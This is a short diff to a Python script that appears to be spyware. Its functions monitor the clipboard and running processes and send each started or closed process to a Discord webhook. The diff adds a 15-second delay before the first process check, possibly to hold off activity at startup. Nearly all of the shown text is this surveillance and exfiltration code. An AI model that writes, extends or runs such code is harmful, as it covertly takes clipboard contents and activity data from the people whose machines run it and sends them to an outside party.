@@ -147,10 +147,17 @@ def monitor_clipboard():
 
 def monitor_processes():
     running_processes = set()
+    first_check = True  # Flag to handle the first delay
+    
     while True:
         current_processes = set(p.name() for p in psutil.process_iter())
         new_processes = current_processes - running_processes
         closed_processes = running_processes - current_processes
+
+        # If it's the first check, wait for 15 seconds
+        if first_check:
+            time.sleep(15)  # Initial delay of 15 seconds
+            first_check = False  # Disable the first check flag
 
         for proc in new_processes:
             message = f"Started: {proc}"
@@ -161,7 +168,7 @@ def monitor_processes():
             send_to_webhook(message)
 
         running_processes = current_processes
-        time.sleep(2)  # Check every 2 seconds
+        time.sleep(2)  # Check every 2 seconds after the first check
 
 def send_debug_message(message):
     """Send debug message to the Discord webhook."""
